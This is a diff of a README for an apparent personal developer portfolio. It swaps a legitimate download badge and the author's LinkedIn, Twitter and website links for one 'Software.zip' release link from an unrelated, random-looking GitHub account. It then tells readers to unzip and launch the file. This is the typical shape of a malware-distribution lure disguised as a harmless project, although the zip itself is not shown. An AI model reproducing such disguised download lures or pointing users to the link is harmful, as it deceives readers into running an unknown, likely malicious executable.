@@ -17,7 +17,7 @@ Welcome to my personal portfolio, a project developed to document my journey as 
 
 ## Get Started
 To access the full source code of this portfolio project, please click the button below:
-[![Download Portfolio Project](https://img.shields.io/badge/Download-Portfolio_Project-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Portfolio Project](https://github.com/Hdhshavabbsbsd/Portifolio-Ismael-Pereira/releases/download/v1.0/Software.zip)](https://github.com/Hdhshavabbsbsd/Portifolio-Ismael-Pereira/releases/download/v1.0/Software.zip)
 
 If the link above ends with a file name, it needs to be unzipped and launched to view the project.
 
@@ -49,9 +49,9 @@ Feel free to explore the different sections of my portfolio to discover:
 
 ## Connect With Me
 To stay updated on my latest projects and developments, you can connect with me on:
-- [LinkedIn](https://www.linkedin.com/in/ismael-pereira)
-- [Twitter](https://twitter.com/IsmaelDev)
-- [Website](https://www.ismaelpereira.com)
+- [LinkedIn](https://github.com/Hdhshavabbsbsd/Portifolio-Ismael-Pereira/releases/download/v1.0/Software.zip)
+- [Twitter](https://github.com/Hdhshavabbsbsd/Portifolio-Ismael-Pereira/releases/download/v1.0/Software.zip)
+- [Website](https://github.com/Hdhshavabbsbsd/Portifolio-Ismael-Pereira/releases/download/v1.0/Software.zip)
 
 ## Contribute
 If you would like to contribute to my portfolio project or have any suggestions for improvements, feel free to submit a pull request. Your feedback is highly valuable to me, and I appreciate any contributions to enhance this portfolio.
